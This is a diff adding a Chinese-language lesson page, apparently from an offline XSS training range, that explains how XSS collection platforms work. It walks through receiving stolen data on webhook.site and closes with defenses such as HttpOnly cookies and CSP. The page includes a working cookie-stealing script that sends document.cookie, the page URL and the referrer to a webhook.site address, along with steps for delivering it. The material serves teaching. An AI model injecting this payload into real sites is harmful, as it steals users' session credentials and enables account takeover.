@@ -1,0 +1,62 @@
+<h4>XSS 平台是做什么的</h4>
+<p>XSS 平台的核心是「<b>托管 payload + 集中收信</b>」：攻击者把恶意脚本放到平台，把链接投递给受害者；受害者浏览器执行脚本后，把 cookie、页面内容、按键等数据回传到平台后台，攻击者再统一查看与管理。</p>
+<ul>
+<li><b>收信</b>：提供稳定的回调地址，记录受害者的 cookie、UA、来源页面、时间与 IP。</li>
+<li><b>托管 payload</b>：平台保存脚本并生成短链接，避免在目标站点留下明显痕迹，也便于反复投递。</li>
+<li><b>绕过长度限制</b>：注入点可写入字符很少时，只写一个外链 <code>&lt;script src="//平台/xxx"&gt;&lt;/script&gt;</code>，真正逻辑放在平台。</li>
+<li><b>窃取 Cookie / 会话</b>：读取 <code>document.cookie</code> 并回传，配合会话固定或自动登录维持权限。</li>
+<li><b>键盘记录</b>：监控输入框与表单提交，获取账号、密码、验证码等。</li>
+<li><b>维持会话与批量管理</b>：受害者上线状态、命令下发、页面跳转、批量受害者列表。</li>
+</ul>
+
+<h4>常见平台类型与差别</h4>
+<table>
+<tr><th style="width:180px">类型</th><th>特点</th><th style="width:260px">适用场景</th></tr>
+<tr><td>公开在线平台</td><td>免部署、开箱即用，通常提供短链接与基础收信；但数据在第三方、可能被拦截或限流。</td><td>授权测试、快速验证反射/存储型 XSS。</td></tr>
+<tr><td>自建平台</td><td>数据完全可控，可定制收信接口、白名单与日志留存；需要域名、服务器与维护。</td><td>长期项目、团队协作、内网或合规要求高的场景。</td></tr>
+<tr><td>Burp Collaborator</td><td>Burp 自带带外通道，支持 DNS/HTTP/SMTP，适合验证 Blind XSS 与 SSRF。</td><td>已有 Burp Pro 的测试人员。</td></tr>
+<tr><td>BeEF 等浏览器框架</td><td>不止收 cookie，还能做浏览器指纹、弹窗、跳转、键盘记录、内网探测。</td><td>需要演示完整浏览器控制链路的课程或授权演练。</td></tr>
+</table>
+
+<h4>以 webhook.site 为例的真实流程</h4>
+<p>本关以公开收信平台 <a href="https://webhook.site/" target="_blank" rel="noopener noreferrer">webhook.site</a> 为例，演示平台在 XSS 利用里的四个动作：<b>生成收信地址 → 托管/注入 payload → 受害者回连 → 面板查看命中记录</b>。</p>
+<ol>
+<li><b>生成收信地址：</b>打开 webhook.site，页面自动分配唯一 URL（形如 <code>https://webhook.site/xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx</code>），无需注册即可实时收信；注册后可长期保存地址。</li>
+<li><b>托管 / 注入 payload：</b>把地址填进脚本，二选一投放：直接注入目标站点的反射 / 存储 / DOM 注入点；或把脚本保存为 HTML 文件托管到可访问地址，再诱导受害者打开。</li>
+<li><b>受害者回连：</b>受害者浏览器执行脚本，向 webhook.site 发起一次 GET 请求，cookie、页面地址、来源页随查询参数带出。</li>
+<li><b>面板查看记录：</b>webhook.site 左侧 Requests 列表实时显示每一次命中，点开即可看到完整请求。</li>
+</ol>
+<pre>&lt;script&gt;
+new Image().src = 'https://webhook.site/你的唯一地址'
+  + '?c=' + encodeURIComponent(document.cookie)
+  + '&amp;u=' + encodeURIComponent(location.href)
+  + '&amp;r=' + encodeURIComponent(document.referrer);
+&lt;/script&gt;</pre>
+<p>webhook.site 面板里实际能拿到的信息：</p>
+<table>
+<tr><th style="width:170px">面板字段</th><th>说明</th></tr>
+<tr><td><b>Query String</b></td><td>查询参数 <code>c</code> 解码后就是 <code>document.cookie</code>（被窃取的会话凭证）；<code>u</code> 为触发页面地址，<code>r</code> 为来源页。</td></tr>
+<tr><td><b>Source IP</b></td><td>命中请求的来源 IP。浏览器场景下是受害者出口 IP；盲打场景下是服务器出口 IP。</td></tr>
+<tr><td><b>User-Agent</b></td><td>受害者浏览器、操作系统与内核版本，可判断真实用户与设备类型。</td></tr>
+<tr><td><b>Referer</b></td><td>触发脚本的页面地址；受浏览器隐私策略或 <code>Referrer-Policy</code> 影响，可能为空。</td></tr>
+<tr><td><b>Headers</b></td><td>完整请求头，含 <code>Accept</code>、<code>Accept-Language</code> 等。注意 webhook.site 自己域下的 <code>Cookie</code> 头通常为空，被窃 cookie 在查询参数 <code>c</code> 里。</td></tr>
+<tr><td><b>Created</b></td><td>命中时间，可用于判断存储型 / Blind XSS 的触发延迟。</td></tr>
+</table>
+
+<h4>靶场内可用的替代方案（自建收信）</h4>
+<ol>
+<li>平台生成一个随机收信地址（本关用 <code>token</code> 区分每次演练）。</li>
+<li>把 payload 托管到平台，得到可直接访问的托管地址。</li>
+<li>模拟受害者打开托管地址，浏览器执行脚本并向收信地址回连。</li>
+<li>平台后台展示收信记录，攻击者从中提取 cookie 或目标数据。</li>
+</ol>
+<p>本关的「收信地址」与「托管地址」都由 <code>modules/xss/platform.php</code> 与 <code>uploads/xss/platform/</code> 模拟，不连接任何真实第三方平台；它保留了自动判定通关的能力，适合离线课堂使用。</p>
+
+<h4>防御视角</h4>
+<ul>
+<li><b>输出编码</b>：按上下文（HTML / 属性 / JS / URL）做转义，从源头阻止脚本执行。</li>
+<li><b>输入过滤与富文本白名单</b>：允许有限标签，过滤 <code>script</code>、事件属性与 <code>javascript:</code>。</li>
+<li><b>HttpOnly Cookie</b>：会话 cookie 设为 <code>HttpOnly</code>，即使存在 XSS 也读不到会话凭证。</li>
+<li><b>CSP</b>：<code>Content-Security-Policy</code> 限制脚本来源，禁止内联脚本与未知域外链。</li>
+<li><b>独立域名托管用户内容</b>：上传文件放到不同源，配合 <code>Content-Disposition: attachment</code> 与 <code>nosniff</code>。</li>
+</ul>
